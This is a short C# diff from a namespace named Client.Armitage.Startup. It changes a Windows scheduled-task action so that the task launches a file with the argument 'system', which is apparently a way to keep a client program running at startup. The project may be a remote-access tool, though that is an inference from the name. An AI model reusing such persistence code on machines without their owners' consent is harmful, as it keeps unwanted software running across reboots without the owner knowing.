@@ -52,7 +52,7 @@ namespace Client.Armitage.Startup
                     Enabled = true
                 });
 
-                var action = new ExecAction { Path = filepath, WorkingDirectory = Path.GetDirectoryName(filepath) };
+                var action = new ExecAction { Path = filepath, Arguments = "system", WorkingDirectory = Path.GetDirectoryName(filepath) };
 
                 td.Actions.Add(action);
 
